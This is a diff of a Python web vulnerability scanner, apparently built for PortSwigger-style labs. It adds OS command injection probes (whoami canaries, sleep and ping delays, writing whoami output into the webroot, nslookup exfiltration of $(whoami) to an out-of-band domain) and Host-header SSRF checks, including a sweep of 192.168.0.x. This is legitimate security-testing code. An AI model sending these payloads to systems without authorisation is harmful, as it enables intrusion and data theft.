@@ -3144,164 +3144,402 @@ class SatriaBaruScanner:
 
     # ======================== OS Command Injection (113-117, konservatif, bukti terverifikasi) ========================
 
+    @staticmethod
+    def _os_cmdi_value(point: Point, injection: str) -> str:
+        """Jaga nilai asli parameter sebelum menambahkan operator/perintah uji."""
+        base = str(getattr(point, "original", "") or "").strip()
+        if not base:
+            name = str(getattr(point, "name", "") or "").lower()
+            base = "x" if any(k in name for k in ("email", "user", "name", "message")) else "1"
+        return base + injection
+
     def _os_cmdi_candidates(self, pages: list[Page], points: list[Point]) -> list[tuple[Point, str]]:
-        keywords = ("cmd", "command", "exec", "execute", "ping", "ip", "host", "domain", "dns", "file", "path",
-                    "dir", "name", "email", "to", "subject", "query", "search", "user", "username", "url", "arg",
-                    "store", "stock", "product", "feedback", "message", "data")
-        cand = []
-        seen = set()
-        for p in points:
-            try:
-                nm = (getattr(p, "name", "") or "").lower()
-                url = getattr(p, "url", "") or ""
-                key = (url, nm, getattr(p, "kind", ""))
-                if key in seen: continue
-                score = 0
-                for kw in keywords:
-                    if kw in nm: score += 2
-                if any(k in url.lower() for k in ("feedback", "stock", "product", "store", "mail", "email", "ping", "lookup", "dns")):
-                    score += 1
-                if score > 0:
-                    seen.add(key); cand.append((p, nm))
-            except Exception:
-                continue
-        if not cand:
-            for p in points[:12]:
-                try:
-                    nm = (getattr(p, "name", "") or "").lower()
-                    key = (getattr(p, "url", ""), nm)
-                    if key in seen: continue
-                    seen.add(key); cand.append((p, nm))
-                except Exception:
+        """Gabungkan crawler points dengan input form POST yang dilewati _build_points."""
+        keywords = (
+            "cmd", "command", "exec", "execute", "ping", "ip", "host", "domain",
+            "dns", "file", "path", "dir", "name", "email", "to", "subject",
+            "query", "search", "user", "username", "url", "arg", "store",
+            "stock", "product", "feedback", "message", "data", "filename",
+            "comment", "text", "input",
+        )
+        action_hints = (
+            "feedback", "stock", "product", "store", "mail", "email", "ping",
+            "lookup", "dns", "command", "exec", "contact", "submit",
+        )
+        text_types = {"text", "email", "search", "url", "tel", "number", "textarea"}
+        candidates: dict[tuple[str, str, str, str], tuple[Point, int]] = {}
+
+        def add(point: Point, score: int) -> None:
+            key = (
+                str(getattr(point, "url", "") or ""),
+                str(getattr(point, "name", "") or "").lower(),
+                str(getattr(point, "kind", "") or ""),
+                str(getattr(point, "method", "") or "").upper(),
+            )
+            old = candidates.get(key)
+            if old is None or score > old[1]:
+                candidates[key] = (point, score)
+
+        for point in points:
+            name = str(getattr(point, "name", "") or "").lower()
+            context = (
+                str(getattr(point, "url", "") or "") + " "
+                + str(getattr(point, "page_url", "") or "")
+            ).lower()
+            score = sum(2 for keyword in keywords if keyword in name)
+            score += 5 if any(hint in context for hint in action_hints) else 0
+            score += 2 if getattr(point, "kind", "") == "form" else 0
+            if score:
+                add(point, score)
+
+        # Form POST tidak dibuat oleh _build_points, padahal lab blind CMDi
+        # menguji field email/feedback melalui POST.
+        for page in pages[:120]:
+            page_url = str(getattr(page, "url", "") or self.target_url)
+            for form_index, form in enumerate((getattr(page, "forms", []) or [])[:20]):
+                method = str(getattr(form, "method", "get") or "get").upper()
+                if method not in ("POST", "PUT", "PATCH"):
                     continue
-        cand.sort(key=lambda x: (0 if any(k in x[1] for k in ("cmd","command","exec","ping","ip","host","email","store","stock")) else 1))
-        return cand[:20]
+                action = str(getattr(form, "action", "") or page_url)
+                if not self._same_origin(action):
+                    continue
+                action_path = urlparse(action).path or "/"
+                if DESTRUCTIVE_PATH_RE.search(action_path):
+                    continue
+                fields = tuple(getattr(form, "fields", ()) or ())
+                names = [str(name).strip() for name, _value, _typ in fields if name]
+                names_low = {name.lower() for name in names}
+                context = (action + " " + page_url).lower()
+                relevant = (
+                    any(hint in context for hint in action_hints)
+                    or bool(names_low & {
+                        "email", "subject", "message", "feedback", "comment",
+                        "storeid", "productid", "filename", "host", "ip",
+                        "domain", "command", "query", "input",
+                    })
+                )
+                if not relevant:
+                    continue
+                for name, value, field_type in fields:
+                    name = str(name or "").strip()
+                    typ = str(field_type or "").lower()
+                    name_low = name.lower()
+                    if not name or typ in {
+                        "password", "file", "hidden", "checkbox", "radio",
+                        "submit", "button", "reset",
+                    }:
+                        continue
+                    if typ not in text_types and name_low not in {
+                        "email", "subject", "message", "feedback", "comment",
+                        "storeid", "productid", "filename", "host", "ip",
+                        "domain", "command", "query", "input",
+                    }:
+                        continue
+                    score = 18 if name_low in (
+                        "email", "storeid", "productid", "command", "feedback"
+                    ) else 12
+                    score += 8 if any(hint in context for hint in action_hints) else 0
+                    original_value = str(value or "")
+                    if not original_value:
+                        original_value = "x" if any(
+                            k in name_low for k in ("email", "user", "name", "message")
+                        ) else "1"
+                    point = Point(
+                        key=f"os-cmdi-post|{action_path}|{form_index}|{name}",
+                        kind="form", label=f"POST form ({name})",
+                        url=action, name=name, original=original_value,
+                        page_url=page_url, method=method, fields=fields,
+                        interest=score,
+                    )
+                    add(point, score)
+
+        ordered = sorted(
+            candidates.values(),
+            key=lambda item: (-item[1], -int(getattr(item[0], "interest", 0) or 0)),
+        )
+        return [
+            (point, str(getattr(point, "name", "") or "").lower())
+            for point, _score in ordered[:40]
+        ]
+
+    def _os_cmdi_output_urls(self, pages: list[Page], points: list[Point], marker: str) -> list[str]:
+        """Cari endpoint retrieval file seperti /image?filename=... pada lab blind CMDi."""
+        pu = urlparse(self.target_url)
+        origin = f"{pu.scheme}://{pu.netloc}"
+        found: list[str] = []
+        seen: set[str] = set()
+
+        def add(url: str) -> None:
+            if url and self._same_origin(url) and url not in seen:
+                seen.add(url)
+                found.append(url)
+
+        for path in (
+            f"/image?filename={marker}.txt", f"/image?file={marker}.txt",
+            f"/images/{marker}.txt", f"/static/{marker}.txt",
+            f"/download?filename={marker}.txt", f"/file?filename={marker}.txt",
+        ):
+            add(urljoin(origin + "/", path.lstrip("/")))
+
+        for point in points:
+            name = str(getattr(point, "name", "") or "").lower()
+            url = str(getattr(point, "url", "") or "")
+            path = (urlparse(url).path or "").lower()
+            if name not in ("filename", "file", "path", "image", "download") and not any(
+                hint in path for hint in ("/image", "/download", "/file")
+            ):
+                continue
+            parsed = urlparse(url)
+            pairs = parse_qsl(parsed.query, keep_blank_values=True)
+            changed = False
+            for index, (key, _value) in enumerate(pairs):
+                if key.lower() in ("filename", "file", "path", "image"):
+                    pairs[index] = (key, f"{marker}.txt")
+                    changed = True
+            if not changed:
+                pairs.append(("filename", f"{marker}.txt"))
+            add(urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(pairs), "")))
+
+        # src gambar/unduhan tidak selalu masuk antrean link anchor crawler.
+        for page in pages[:100]:
+            page_url = str(getattr(page, "url", "") or self.target_url)
+            html_text = str(getattr(page, "text", "") or "")
+            for match in re.finditer(
+                r"""(?:src|href)\s*=\s*["']([^"']{1,500})["']""", html_text, re.I
+            ):
+                candidate = urljoin(page_url, match.group(1))
+                parsed = urlparse(candidate)
+                path = (parsed.path or "").lower()
+                pairs = parse_qsl(parsed.query, keep_blank_values=True)
+                if not any(hint in path for hint in ("image", "download", "file")) and not any(
+                    key.lower() in ("filename", "file", "path", "image")
+                    for key, _value in pairs
+                ):
+                    continue
+                changed = False
+                for index, (key, _value) in enumerate(pairs):
+                    if key.lower() in ("filename", "file", "path", "image"):
+                        pairs[index] = (key, f"{marker}.txt")
+                        changed = True
+                if not changed:
+                    pairs.append(("filename", f"{marker}.txt"))
+                add(urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(pairs), "")))
+        return found[:8]
 
     def _os_cmdi_mark(self, num: int, point: Point, ev: str, method_name: str):
         self._mark(num, point, ev, method_name)
 
     def phase_os_command_injection(self, pages: list[Page], points: list[Point]) -> None:
-        """Deteksi konservatif OS command injection (113-117). Bukti terverifikasi kuat saja; anti-FP."""
+        """Uji command injection in-band, time-based, file redirection, dan OOB."""
         if not self._within_budget():
             return
+        if isinstance(self._scan_progress, dict):
+            self._scan_progress["request_limit"] = max(
+                int(self._scan_progress.get("request_limit", self.non_sql_category_request_limit)), 500
+            )
         candidates = self._os_cmdi_candidates(pages, points)
         if not candidates:
+            self._scan_progress_event("tidak ada kandidat parameter/form POST OS command injection")
             return
-        out_patterns = [
-            re.compile(r"uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)", re.I),
-            re.compile(r"\broot:x:0:0:", re.I),
-            re.compile(r"Linux\s+\S+\s+\d+\.\d+", re.I),
-            re.compile(r"\bwww-data\b|\bapache\b|\bnginx\b", re.I),
-        ]
-        # 113 simple case
-        if 113 not in self._confirmed:
-            simple_payloads = ["|id",";id","||id","&&id","&id","`id`","$(id)","|whoami",";whoami","||whoami","&&whoami","|uname -a",";uname -a"]
-            for point, _nm in candidates:
-                if 113 in self._confirmed or not self._within_budget(): break
-                try:
-                    base = self.send(point, getattr(point, "original", "test") or "test")
-                    base_text = getattr(base, "text", "") or ""
-                except Exception:
-                    base_text = ""
-                for pl in simple_payloads:
-                    if 113 in self._confirmed or not self._within_budget(): break
-                    try:
-                        resp = self.send(point, pl)
-                    except Exception:
-                        continue
-                    rtext = getattr(resp, "text", "") or ""
-                    if not rtext or rtext == base_text: continue
-                    for pat in out_patterns:
-                        m = pat.search(rtext)
-                        if m and not pat.search(base_text):
-                            ev = f"Output OS command terverifikasi pada '{getattr(point,'name','')}' ({getattr(point,'url','')}) payload {pl!r}: {m.group(0)[:120]!r} (tidak ada pada baseline)."
-                            self._os_cmdi_mark(113, point, ev, "os_cmdi_simple")
-                            break
 
-        # 114 blind time delays
-        if 114 not in self._confirmed and self._within_budget():
-            delay_payloads = [("|sleep 5",4.0),(";sleep 5",4.0),("||sleep 5",4.0),("&&sleep 5",4.0),("& sleep 5 &",4.0),("`sleep 5`",4.0),("$(sleep 5)",4.0),("|ping -c 5 127.0.0.1",3.5),(";ping -c 5 127.0.0.1",3.5)]
-            for point, _nm in candidates:
-                if 114 in self._confirmed or not self._within_budget(): break
-                base_times = []
-                for _ in range(2):
+        import uuid as _uuid
+        marker = f"SATRIA-CMDI-{_uuid.uuid4().hex[:12]}"
+        marker_end = f"SATRIA-CMDI-END-{_uuid.uuid4().hex[:10]}"
+
+        # 113: output unik dari perintah echo/whoami; tidak mengandalkan username OS tertentu.
+        if 113 not in self._confirmed:
+            probes = (
+                f"|echo {marker}; whoami; echo {marker_end}",
+                f"& echo {marker} & whoami & echo {marker_end} &",
+                f"&& echo {marker} && whoami && echo {marker_end}",
+                f"|| echo {marker} && whoami && echo {marker_end} ||",
+                f"; echo {marker}; whoami; echo {marker_end};",
+                f"\n echo {marker}; whoami; echo {marker_end}",
+            )
+            for point, _name in candidates[:10]:
+                if 113 in self._confirmed or not self._within_budget():
+                    break
+                try:
+                    baseline = self.send(point, str(point.original or "1"))
+                except Exception:
+                    baseline = None
+                base_body = str(getattr(baseline, "text", "") or "")
+                for injection in probes:
+                    if 113 in self._confirmed or not self._within_budget():
+                        break
                     try:
-                        b = self.send(point, getattr(point,"original","test") or "test")
-                        base_times.append(float(getattr(b,"elapsed",0.0) or 0.0))
-                    except Exception: pass
-                base_avg = (sum(base_times)/len(base_times)) if base_times else 0.5
-                for pl, threshold in delay_payloads:
-                    if 114 in self._confirmed or not self._within_budget(): break
-                    try:
-                        t1 = float(getattr(self.send(point, pl), "elapsed", 0.0) or 0.0)
-                        t2 = float(getattr(self.send(point, pl), "elapsed", 0.0) or 0.0)
+                        response = self.send(point, self._os_cmdi_value(point, injection))
                     except Exception:
                         continue
-                    if t1 >= threshold and t2 >= threshold and t1 >= base_avg + 3.0 and t2 >= base_avg + 3.0:
-                        ev = f"Blind OS cmdi (time delay) terverifikasi pada '{getattr(point,'name','')}' payload {pl!r}: {t1:.2f}s & {t2:.2f}s (baseline ~{base_avg:.2f}s)."
-                        self._os_cmdi_mark(114, point, ev, "os_cmdi_blind_time")
+                    body = str(getattr(response, "text", "") or "")
+                    if marker in body and marker_end in body and marker not in base_body:
+                        self._os_cmdi_mark(
+                            113, point,
+                            f"Eksekusi OS terverifikasi pada {point.method} {point.url}, "
+                            f"field {point.name}: canary {marker!r} dan penanda akhir "
+                            f"{marker_end!r} muncul pada respons.",
+                            "os_cmdi_simple",
+                        )
                         break
 
-        # 115 blind output redirection
-        if 115 not in self._confirmed and self._within_budget():
-            import uuid as _uuid
-            marker = f"satria-cmdi-{_uuid.uuid4().hex[:10]}"
-            rel_files = [f"/{marker}.txt", f"/images/{marker}.txt", f"/static/{marker}.txt"]
-            abs_targets = [f"/var/www/images/{marker}.txt", f"/var/www/html/{marker}.txt", f"/var/www/static/{marker}.txt"]
-            for point, _nm in candidates:
-                if 115 in self._confirmed or not self._within_budget(): break
-                base_url = getattr(point, "url", self.target_url) or self.target_url
-                pu = urlparse(base_url); origin = f"{pu.scheme}://{pu.netloc}"
-                for abs_t, rel_t in zip(abs_targets, rel_files):
-                    if 115 in self._confirmed or not self._within_budget(): break
-                    for sep in (";","|","&&","||"):
-                        if 115 in self._confirmed or not self._within_budget(): break
-                        pl = f"{sep}echo {marker} > {abs_t}"
-                        try: self.send(point, pl)
-                        except Exception: continue
-                        fetch_url = urljoin(origin + "/", rel_t.lstrip("/"))
-                        try: r = self._request("GET", fetch_url, allow_redirects=True)
-                        except Exception: continue
-                        if (getattr(r,"status",0) or 0) == 200 and marker in (getattr(r,"text","") or ""):
-                            try: btxt = getattr(self._request("GET", base_url, allow_redirects=True), "text", "") or ""
-                            except Exception: btxt = ""
-                            if marker not in btxt:
-                                self._os_cmdi_mark(115, point, f"Blind OS cmdi (output redirection) terverifikasi payload {pl!r}: marker {marker!r} terambil dari {fetch_url} (HTTP 200).", "os_cmdi_blind_output_redirection")
-                                break
+        # 114: delay harus muncul dua kali dan melebihi baseline.
+        if 114 not in self._confirmed and self._within_budget():
+            delay_probes = (
+                ("||ping -c 5 127.0.0.1||", 4.1),
+                ("& ping -c 5 127.0.0.1 &", 4.1),
+                ("||sleep 5||", 4.2),
+                (";sleep 5;", 4.2),
+                ("&& sleep 5 &&", 4.2),
+                ("||ping -n 6 127.0.0.1 > nul||", 4.1),
+            )
+            for point, _name in candidates[:8]:
+                if 114 in self._confirmed or not self._within_budget():
+                    break
+                base_value = str(point.original or "1")
+                baseline_times: list[float] = []
+                for _ in range(2):
+                    if not self._within_budget():
+                        break
+                    try:
+                        response = self.send(point, base_value)
+                        if not response.error:
+                            baseline_times.append(float(response.elapsed or 0.0))
+                    except Exception:
+                        continue
+                if len(baseline_times) < 2:
+                    continue
+                baseline_avg = sum(baseline_times) / len(baseline_times)
+                for injection, threshold in delay_probes:
+                    if 114 in self._confirmed or not self._within_budget():
+                        break
+                    elapsed_values: list[float] = []
+                    for _ in range(2):
+                        if not self._within_budget():
+                            break
+                        try:
+                            response = self.send(point, self._os_cmdi_value(point, injection))
+                            if not response.error:
+                                elapsed_values.append(float(response.elapsed or 0.0))
+                        except Exception:
+                            continue
+                    if len(elapsed_values) == 2 and all(
+                        elapsed >= threshold and elapsed >= baseline_avg + 3.5
+                        for elapsed in elapsed_values
+                    ):
+                        self._os_cmdi_mark(
+                            114, point,
+                            f"Blind OS command injection time-delay terverifikasi: "
+                            f"{elapsed_values[0]:.2f}s dan {elapsed_values[1]:.2f}s "
+                            f"(baseline {baseline_avg:.2f}s) pada {point.url}.",
+                            "os_cmdi_blind_time",
+                        )
+                        break
 
-        # 116 & 117 blind OOB interaction & exfiltration
-        if self.oob and (116 not in self._confirmed or 117 not in self._confirmed) and self._within_budget():
-            oob_domain = getattr(self.oob, "domain", "") or ""
-            oob_token = getattr(self.oob, "token", "") or ""
-            if oob_domain:
-                import uuid as _uuid
-                tag = _uuid.uuid4().hex[:8]
-                host_i = f"{tag}.{oob_domain}".strip(".")
-                host_e = f"{tag}e.{oob_domain}".strip(".")
-                interact_payloads = [f"|nslookup {host_i}", f";nslookup {host_i}", f"&nslookup {host_i}&", f"|curl http://{host_i}/", f";curl http://{host_i}/", f"&curl http://{host_i}/ &"]
-                exfil_payloads = [f"|nslookup $(whoami).{host_e}", f";nslookup $(whoami).{host_e}", f"&nslookup $(whoami).{host_e}&", f"||nslookup `whoami`.{host_e}"]
-                targets = candidates if candidates else [(self._dummy_point(), "")]
-                for point, _nm in targets:
-                    if (116 in self._confirmed and 117 in self._confirmed) or not self._within_budget(): break
+        # 115: tulis hasil whoami ke webroot dan ambil kembali melalui /image?filename=.
+        if 115 not in self._confirmed and self._within_budget():
+            file_marker = f"satria-cmdi-{_uuid.uuid4().hex[:12]}"
+            file_name = f"{file_marker}.txt"
+            write_targets = (
+                f"/var/www/images/{file_name}",
+                f"/var/www/static/{file_name}",
+                f"/var/www/html/{file_name}",
+            )
+            retrieval_urls = self._os_cmdi_output_urls(pages, points, file_marker)
+            for point, _name in candidates[:6]:
+                if 115 in self._confirmed or not self._within_budget():
+                    break
+                for directory in write_targets:
+                    if 115 in self._confirmed or not self._within_budget():
+                        break
+                    injection = f"||whoami>{directory}||"
+                    try:
+                        self.send(point, self._os_cmdi_value(point, injection))
+                    except Exception:
+                        continue
+                    for fetch_url in retrieval_urls:
+                        if 115 in self._confirmed or not self._within_budget():
+                            break
+                        try:
+                            fetched = self._request("GET", fetch_url, allow_redirects=True)
+                        except Exception:
+                            continue
+                        body = str(getattr(fetched, "text", "") or "").strip()
+                        content_type = str((getattr(fetched, "headers", {}) or {}).get("Content-Type", "")).lower()
+                        plain = (
+                            (getattr(fetched, "status", None) or 0) == 200
+                            and bool(body) and len(body) <= 300
+                            and "html" not in content_type
+                            and not re.search(r"<(?:html|body|img)\b", body, re.I)
+                        )
+                        command_output = bool(
+                            re.fullmatch(r"[A-Za-z0-9_.@-]{1,80}", body)
+                            or re.search(r"uid=\d+\([^)]+\)\s+gid=\d+", body)
+                        )
+                        if plain and command_output:
+                            self._os_cmdi_mark(
+                                115, point,
+                                f"Blind OS command injection output-redirection terverifikasi: "
+                                f"hasil perintah di file acak {file_name!r} diambil lewat {fetch_url}.",
+                                "os_cmdi_blind_output_redirection",
+                            )
+                            break
+
+        # 116/117: OOB hanya menggunakan poller yang memang dikonfigurasi pengguna.
+        if self.oob and self.oob.poll_url and (
+            (116 not in self._confirmed or 117 not in self._confirmed)
+            and self._within_budget()
+        ):
+            domain = str(getattr(self.oob, "domain", "") or "").strip(".")
+            token = str(getattr(self.oob, "token", "") or "")
+            if domain and token:
+                interaction_host = f"{token}.{_uuid.uuid4().hex[:8]}.{domain}"
+                exfil_host = f"$(whoami).{token}.{_uuid.uuid4().hex[:8]}.{domain}"
+                for point, _name in candidates[:5]:
+                    if 116 in self._confirmed and 117 in self._confirmed:
+                        break
+                    if not self._within_budget():
+                        break
                     if 116 not in self._confirmed:
-                        for pl in interact_payloads:
-                            if 116 in self._confirmed or not self._within_budget(): break
-                            try: self.send(point, pl)
-                            except Exception: pass
-                        try: got = self._poll_oob()
-                        except Exception: got = None
-                        if got and getattr(got, "interactions", None):
-                            self._os_cmdi_mark(116, point, f"Blind OS cmdi (OOB interaction) terverifikasi: interaksi ke {host_i} tercatat (token {oob_token}).", "os_cmdi_blind_oob_interaction")
-                    if 117 not in self._confirmed:
-                        for pl in exfil_payloads:
-                            if 117 in self._confirmed or not self._within_budget(): break
-                            try: self.send(point, pl)
-                            except Exception: pass
-                        try: got = self._poll_oob()
-                        except Exception: got = None
-                        vals = getattr(got, "values", None) if got else None
-                        if vals:
-                            self._os_cmdi_mark(117, point, f"Blind OS cmdi (OOB data exfiltration) terverifikasi: data exfiltrated {vals} (token {oob_token}).", "os_cmdi_blind_oob_exfiltration")
+                        for operator in ("||", "&", ";", "|"):
+                            if not self._within_budget():
+                                break
+                            try:
+                                self.send(point, self._os_cmdi_value(
+                                    point, f"{operator}nslookup {interaction_host}{operator}"
+                                ))
+                            except Exception:
+                                continue
+                        try:
+                            interaction = self._poll_oob()
+                        except Exception:
+                            interaction = None
+                        if interaction and getattr(interaction, "interactions", None):
+                            self._os_cmdi_mark(
+                                116, point,
+                                f"Blind OS command injection OOB terverifikasi: interaksi "
+                                f"menuju domain uji {domain!r} tercatat oleh poller.",
+                                "os_cmdi_blind_oob_interaction",
+                            )
+                    if 117 not in self._confirmed and self._within_budget():
+                        for operator in ("||", ";", "|"):
+                            if not self._within_budget():
+                                break
+                            try:
+                                self.send(point, self._os_cmdi_value(
+                                    point, f"{operator}nslookup {exfil_host}{operator}"
+                                ))
+                            except Exception:
+                                continue
+                        try:
+                            exfil = self._poll_oob()
+                        except Exception:
+                            exfil = None
+                        if exfil and getattr(exfil, "values", None):
+                            self._os_cmdi_mark(
+                                117, point,
+                                "Blind OS command injection OOB data-result tercatat oleh poller.",
+                                "os_cmdi_blind_oob_exfiltration",
+                            )
 
 
     # ======================== Web Cache Poisoning (118-130, bukti cache terverifikasi) ========================
@@ -4232,48 +4470,137 @@ class SatriaBaruScanner:
         return self._smug_parse_responses(buf)
 
     def _host_targets(self, pages: list[Page]) -> list[str]:
+        """Kumpulkan halaman admin dari route umum dan hasil crawl."""
         pu = urlparse(self.target_url)
         origin = f"{pu.scheme}://{pu.netloc}"
-        out = [urljoin(origin + "/", "admin"), urljoin(origin + "/", "admin/")]
-        for pg in pages[:12]:
-            u = getattr(pg, "url", "") or ""
-            if "admin" in u.lower() and u not in out and self._same_origin(u):
-                out.append(u)
-            for link in getattr(pg, "links", [])[:40]:
-                if "admin" in (link or "").lower() and self._same_origin(link) and link not in out:
-                    out.append(link)
-        return out[:4]
+        out: list[str] = []
+        seen: set[str] = set()
+
+        def add(url: str) -> None:
+            if url and self._same_origin(url):
+                clean = url.split("#", 1)[0]
+                if clean not in seen:
+                    seen.add(clean)
+                    out.append(clean)
+
+        for path in (
+            "/admin", "/admin/", "/administrator", "/admin-panel",
+            "/admin/users", "/admin/dashboard", "/admin.php",
+            "/administrator/", "/admin-area",
+        ):
+            add(urljoin(origin + "/", path.lstrip("/")))
+        for page in pages[:80]:
+            page_url = str(getattr(page, "url", "") or "")
+            if "admin" in page_url.lower():
+                add(page_url)
+            for link in (getattr(page, "links", []) or [])[:80]:
+                if "admin" in str(link).lower():
+                    add(str(link))
+        return out[:16]
+
 
     def _host_reset_targets(self, pages: list[Page]) -> list[tuple[str, str]]:
-        """(url, field) kandidat untuk alur reset password."""
+        """Temukan endpoint reset dari form, link, dan route umum."""
+        out: list[tuple[str, str]] = []
+        seen: set[tuple[str, str]] = set()
+        reset_re = re.compile(r"(forgot|reset|password|recover|recovery)", re.I)
+
+        def add(url: str, field: str) -> None:
+            if url and self._same_origin(url):
+                item = (url.split("#", 1)[0], field)
+                if item not in seen:
+                    seen.add(item)
+                    out.append(item)
+
+        for page in pages[:100]:
+            page_url = str(getattr(page, "url", "") or "")
+            for form in (getattr(page, "forms", []) or [])[:15]:
+                action = str(getattr(form, "action", "") or page_url)
+                if not reset_re.search((action + " " + page_url).lower()):
+                    continue
+                names = [
+                    str(name) for name, _value, _typ in (getattr(form, "fields", ()) or ())
+                    if name
+                ]
+                selected = next((
+                    name for name in names
+                    if name.lower() in ("email", "username", "user", "login", "identifier")
+                ), None)
+                if selected:
+                    add(action, selected)
+                else:
+                    for name in names:
+                        if name.lower() not in ("csrf", "token", "authenticity_token"):
+                            add(action, name)
+                            break
+            if reset_re.search(page_url):
+                add(page_url, "email")
+            for link in (getattr(page, "links", []) or [])[:100]:
+                if reset_re.search(str(link)):
+                    add(str(link), "email")
+
         pu = urlparse(self.target_url)
         origin = f"{pu.scheme}://{pu.netloc}"
-        out: list[tuple[str, str]] = []
-        for pg in pages[:20]:
-            u = getattr(pg, "url", "") or ""
-            if any(k in u.lower() for k in ("forgot", "reset", "password")) and "change" not in u.lower():
-                out.append((u, "username"))
-            for form in getattr(pg, "forms", [])[:6]:
-                action = getattr(form, "action", "") or u
-                if any(k in (action or "").lower() for k in ("forgot", "reset", "password")) and "change" not in (action or "").lower():
-                    names = [n for n, _v, _t in getattr(form, "fields", [])[:8] if n]
-                    for guess in ("email", "username", "user"):
-                        if guess in names:
-                            out.append((action, guess))
-                            break
-                    else:
-                        if names:
-                            out.append((action, names[0]))
-        for fallback, field in ((urljoin(origin + "/", "forgot-password"), "email"),
-                                (urljoin(origin + "/", "forgot-password"), "username")):
-            if all(fallback != u for u, _ in out):
-                out.append((fallback, field))
-        return out[:6]
+        for path in (
+            "/forgot-password", "/forgot_password", "/password-reset",
+            "/reset-password", "/account/forgot-password",
+            "/users/password/new", "/auth/forgot-password",
+        ):
+            route = urljoin(origin + "/", path.lstrip("/"))
+            add(route, "email")
+            add(route, "username")
+        return out[:24]
+
+
+    def _host_reset_post(
+        self, url: str, field: str, pages: list[Page],
+        headers: dict[str, str] | None = None,
+    ) -> Response:
+        """Submit form reset dengan hidden/CSRF fields terbaru."""
+        identity = (
+            os.getenv("SATRIA_TEST_EMAIL")
+            or os.getenv("SATRIA_TEST_USERNAME")
+            or "wiener"
+        )
+        source_url = url
+        target_path = urlparse(url).path
+        data: dict[str, str] = {}
+        for page in pages[:100]:
+            for form in (getattr(page, "forms", []) or [])[:20]:
+                action = str(getattr(form, "action", "") or "")
+                if self._same_origin(action) and urlparse(action).path == target_path:
+                    source_url = str(
+                        getattr(form, "page_url", "") or getattr(page, "url", "") or url
+                    )
+                    data = {
+                        str(name): value for name, value, _typ in form.fields if name
+                    }
+                    break
+        if self._within_budget():
+            fresh = self._request("GET", source_url, allow_redirects=True)
+            if not fresh.error and fresh.text:
+                forms = self._parse_forms(
+                    fresh.url or source_url, BeautifulSoup(fresh.text, "html.parser")
+                )
+                for form in forms:
+                    if urlparse(form.action).path == target_path:
+                        data = {
+                            str(name): value for name, value, _typ in form.fields if name
+                        }
+                        break
+        data[field] = identity
+        return self._request(
+            "POST", url, data=data, headers=headers or {}, allow_redirects=False,
+        )
 
     def phase_http_host_header_attacks(self, pages: list[Page], points: list[Point]) -> None:
         if not self._within_budget():
             return
         import uuid as _uuid
+        if isinstance(self._scan_progress, dict):
+            self._scan_progress["request_limit"] = max(
+                int(self._scan_progress.get("request_limit", self.non_sql_category_request_limit)), 500
+            )
         pu = urlparse(self.target_url)
         origin = f"{pu.scheme}://{pu.netloc}"
         legit_host = pu.netloc
@@ -4287,18 +4614,35 @@ class SatriaBaruScanner:
             for au in admin_urls:
                 if 137 in self._confirmed or not self._within_budget():
                     break
-                base = self._request("GET", au, allow_redirects=True)
+                base = self._request("GET", au, allow_redirects=False)
                 if base.error:
                     continue
                 b_text = base.text or ""
                 b_status = base.status or 0
-                denied = self._host_denied(b_text) or b_status in (401, 403)
+                base_location = str((base.headers or {}).get("Location") or "")
+                base_path = urlparse(urljoin(au, base_location)).path.lower() if base_location else ""
+                denied = (
+                    self._host_denied(b_text) or b_status in (401, 403)
+                    or (
+                        b_status in (301, 302, 303, 307, 308)
+                        and (base_path in ("/", "/login", "/signin", "/sign-in") or "login" in base_path)
+                    )
+                )
                 if not denied:
                     continue
                 for hh in ("localhost", "127.0.0.1", "localhost:80", "localhost:443"):
                     if 137 in self._confirmed or not self._within_budget():
                         break
-                    probe = self._request("GET", au, headers={"Host": hh}, allow_redirects=True)
+                    probe = self._request("GET", au, headers={"Host": hh}, allow_redirects=False)
+                    if probe.error:
+                        continue
+                    if probe.status in (301, 302, 303, 307, 308):
+                        loc = str((probe.headers or {}).get("Location") or "")
+                        redirected = urljoin(au, loc) if loc else ""
+                        if redirected and self._same_origin(redirected) and self._within_budget():
+                            probe = self._request(
+                                "GET", redirected, headers={"Host": hh}, allow_redirects=False
+                            )
                     if probe.error or (probe.status or 0) != 200:
                         continue
                     p_text = probe.text or ""
@@ -4340,33 +4684,88 @@ class SatriaBaruScanner:
                                         "host_header_routing_ssrf")
                         break
 
+        if (
+            139 not in self._confirmed and self.oob and self.oob.poll_url
+            and self._within_budget()
+        ):
+            oob_domain = str(getattr(self.oob, "domain", "") or "").strip(".")
+            oob_token = str(getattr(self.oob, "token", "") or "")
+            if oob_domain and oob_token:
+                oob_host = f"{oob_token}.{uuid.uuid4().hex[:8]}.{oob_domain}"
+                for header_name in ("Host", "X-Forwarded-Host", "X-Host", "X-Forwarded-Server"):
+                    if not self._within_budget():
+                        break
+                    self._request(
+                        "GET", self.target_url, headers={header_name: oob_host},
+                        allow_redirects=False,
+                    )
+                try:
+                    interaction = self._poll_oob()
+                except Exception:
+                    interaction = None
+                if interaction and getattr(interaction, "interactions", None):
+                    self._host_mark(
+                        139, self.target_url,
+                        f"Routing-based SSRF OOB terverifikasi: request menuju domain "
+                        f"uji milik pengguna {oob_domain!r} tercatat oleh poller.",
+                        "host_header_routing_ssrf_oob",
+                    )
+
         # ---------- 140: SSRF via flawed request parsing (absolute-form request target) ----------
+        # Request-line tetap memakai absolute URL milik target; hanya Host header
+        # yang diganti ke alamat internal, sesuai pola lab PortSwigger.
         if 140 not in self._confirmed and self._within_budget():
-            for au in admin_urls[:2]:
+            from concurrent.futures import ThreadPoolExecutor, as_completed
+            admin_path = "/admin"
+            for candidate in admin_urls:
+                candidate_path = urlparse(candidate).path or ""
+                if "admin" in candidate_path.lower():
+                    admin_path = candidate_path
+                    break
+            absolute_target = urljoin(origin + "/", admin_path.lstrip("/"))
+            internal_ips = [f"192.168.0.{number}" for number in range(1, 255)]
+            found_admin = None
+
+            def probe_internal_host(internal_ip: str):
+                raw = self._host_build_request(
+                    f"GET {absolute_target} HTTP/1.1",
+                    [("Host", internal_ip), ("Connection", "close")],
+                )
+                responses = self._host_raw_exchange([raw], 1, timeout=1.8)
+                return internal_ip, responses[0] if responses else None
+
+            for offset in range(0, len(internal_ips), 24):
                 if 140 in self._confirmed or not self._within_budget():
                     break
-                apath = urlparse(au).path or "/admin"
-                base_req = self._host_build_request(f"GET {apath} HTTP/1.1",
-                                                    [("Host", legit_host), ("Connection", "close")])
